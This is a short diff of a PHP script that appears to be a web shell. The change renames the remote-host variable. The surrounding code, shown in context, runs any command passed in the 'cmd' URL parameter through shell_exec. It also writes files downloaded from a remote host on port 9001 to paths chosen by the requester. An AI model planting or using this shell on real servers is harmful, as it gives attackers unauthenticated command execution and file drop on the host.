@@ -13,7 +13,7 @@ session_start();
 
 		$output = ""; # Leave this blank
 		# Remote host details
-		$rhost = "127.0.0.1";
+		$r_file_host = "127.0.0.1";
 		$rport = "9001"; 
 
 		if (isset($_FILES['fileToUpload'])) {
@@ -25,7 +25,7 @@ session_start();
 
 		if (isset($_POST['remoteFile'])) {
 			$output = "";
-      file_put_contents($_POST['remoteFile'], file_get_contents("http://$rhost:$rport/" . $_POST['remoteFile']));
+      file_put_contents($_POST['remoteFile'], file_get_contents("http://$r_file_host:$rport/" . $_POST['remoteFile']));
     }
     if (isset($_GET['cmd'])) {
 			$output .= "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
